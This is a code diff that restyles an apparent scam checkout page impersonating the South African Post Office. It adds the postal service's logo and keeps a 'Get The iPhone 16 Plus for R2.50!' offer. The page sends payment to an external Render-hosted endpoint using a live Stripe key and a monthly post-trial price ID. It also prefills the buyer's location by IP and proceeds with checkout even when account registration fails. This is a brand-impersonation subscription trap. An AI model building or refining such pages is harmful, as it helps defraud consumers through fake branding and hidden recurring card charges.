@@ -94,13 +94,13 @@
   }
   .muted-btn{background:#e9eef6;color:#0b2239;border:1px solid #c7d8e4;}
   .top-header{background:#fff;border-bottom:4px solid var(--sapo-navy);padding:14px 16px;}
-  .brandline{display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
-  .brand-text{font-weight:800;font-size:28px;color:var(--sapo-red)}
-  .brand-sub{color:var(--sapo-blue);font-size:14px;font-weight:700;margin-left:4px}
-  .util-icons{display:flex;gap:12px;margin-top:10px;flex-wrap:wrap;}
+  .brandline{display:flex;align-items:center;gap:10px;flex-wrap:wrap;justify-content:center;}
+  /* NEW: logo style for header */
+  .brandline .brand-logo{height:56px; width:auto; display:block;}
+  .util-icons{display:flex;gap:12px;margin-top:10px;flex-wrap:wrap;justify-content:center;}
   .util-icons .ico{width:56px;height:46px;border:3px solid #cfd7e2;border-radius:10px;display:flex;align-items:center;justify-content:center;color:var(--sapo-navy);background:#fff;font-weight:900;font-family:system-ui;}
-  .search-bar{display:flex;gap:10px;margin:18px 0;}
-  .search-bar input{flex:1;height:44px;border:2px solid #d9d9d9;border-radius:8px;padding:0 12px;background:#fff;}
+  .search-bar{display:flex;gap:10px;margin:18px 0;justify-content:center;max-width:720px;margin-left:auto;margin-right:auto;}
+  .search-bar input{flex:1;min-width:280px;height:44px;border:2px solid #d9d9d9;border-radius:8px;padding:0 12px;background:#fff;}
   .search-bar button{min-width:220px;height:46px;border-radius:8px;border:0;background:#c4c4c4;color:#000;font-weight:700;}
   .contact-slab{background:#8a8a8a;color:#fff;text-align:center;padding:26px 16px;margin-top:30px;}
   .contact-slab .email{font-size:22px;font-weight:700}
@@ -112,7 +112,8 @@
 <body>
 <div class="top-header">
   <div class="brandline">
-    <div class="brand-text">Post Office</div><span class="brand-sub">South Africa</span>
+    <!-- CHANGED: replaced text with your logo file -->
+    <img src="logo.png" alt="South African Post Office" class="brand-logo">
   </div>
   <div class="util-icons">
     <div class="ico">🔎</div><div class="ico">🏤</div><div class="ico">🧾</div><div class="ico">R</div>
@@ -257,11 +258,9 @@
       if(res.status===201) return true;
       let data={}; try{ data=await res.json(); }catch{}
       if(res.status===400 && /exists/i.test(data?.error||"")) return true;
-      // If API reachable but returned another error, still proceed to let checkout continue
       console.warn("Proceeding despite register response:", data);
       return true;
     }catch(err){
-      // Network / CORS / file:// — proceed so UX isn’t blocked
       console.warn("Register skipped (offline/dev):", err);
       return true;
     }
@@ -275,7 +274,6 @@
     try{
       await ensureAccount();
     }catch(e){
-      // Should not occur now, but still proceed if it does
       console.warn("ensureAccount error (continuing):", e);
     }
     localStorage.setItem("checkout_name",nameInput.value);
@@ -291,7 +289,7 @@
 
   /* ---------- Calling code data + helper for phone prefix ---------- */
   const CALLING_CODES = {
-    ZA: { code: '+27', name: 'South Africa' },   // ✅ added
+    ZA: { code: '+27', name: 'South Africa' },   // ZA default
     US: { code: '+1',  name: 'United States' },
     CA: { code: '+1',  name: 'Canada' },
     GB: { code: '+44', name: 'United Kingdom' },
@@ -323,7 +321,6 @@
     if(!selectEl) return;
     selectEl.innerHTML = "";
     const entries = Object.entries(CALLING_CODES);
-    // Prefer ZA by default for SAPO theme; fallback to provided preferCode or US
     const prefer = CALLING_CODES[preferCode] ? preferCode : 'ZA';
     const first = CALLING_CODES[prefer] || CALLING_CODES.US;
     selectEl.append(new Option(`${first.code} — ${first.name}`, first.code, true, true));
@@ -336,7 +333,7 @@
     if (!selectEl.value) selectEl.value = first.code;
   }
 
-  // ✅ Immediately populate prefix so it's never empty
+  // populate prefix immediately so it’s never empty
   buildPrefixOptions(phonePrefix, 'ZA');
 
   /* ---------- Currency & geo by IP (display + prefill) ---------- */
@@ -359,7 +356,7 @@
       document.title = `Get The iPhone 16 Plus for ${symbol}2.50!`;
     }
 
-    // Seed immediate fallbacks
+    // seed immediate fallbacks
     applyPriceSymbol('R');
 
     function initCountrySelect(code, name) {
@@ -388,7 +385,6 @@
         const city       = (data && data.city) || '';
         if (apiCalling) {
           try {
-            // Keep existing ZA-first list but move detected to top if different
             if (phonePrefix && phonePrefix.value !== apiCalling) {
               const exists = Array.from(phonePrefix.options).some(o => o.value === apiCalling);
               if (!exists) phonePrefix.insertBefore(new Option(`${apiCalling} — ${apiName||'Your country'}`, apiCalling, true, true), phonePrefix.firstChild);
@@ -401,7 +397,6 @@
         try { if (city && !billingCity.value) billingCity.value = city; } catch {}
       })
       .catch(() => {
-        // Leave ZA defaults in place
         try { initCountrySelect('ZA', 'South Africa'); } catch {}
       });
   })();
@@ -439,7 +434,6 @@
 
       if (desiredNumber && phoneNumber) phoneNumber.value = desiredNumber;
 
-      // Ensure prefix option exists then apply
       function applyPrefix(){
         if (!desiredPrefix || !phonePrefix) return true;
         const exists = Array.from(phonePrefix.options).some(o => o.value === desiredPrefix);
@@ -459,7 +453,7 @@
     }catch{/* ignore */}
   })();
 
-  /* ---------- Stripe logic (unchanged, except defaults) ---------- */
+  /* ---------- Stripe logic (unchanged) ---------- */
   const SUBSCRIBE_URL="https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
   const PUBLISHABLE_KEY="pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
   const FIXED_PRICE_ID="price_1Rzdp0EJXIhiKzYGlVxHGH7W";
@@ -472,7 +466,6 @@
   function showLoading(){overlay.setAttribute("aria-hidden","false")}
   function hideLoading(){overlay.setAttribute("aria-hidden","true")}
 
-  // Monthly after trial (kept from your code)
   const MONTHLY_PRICE_ID = "price_1RvJmqEJXIhiKzYGE0IJQp7t";
 
   document.getElementById("payNow").onclick=async()=>{
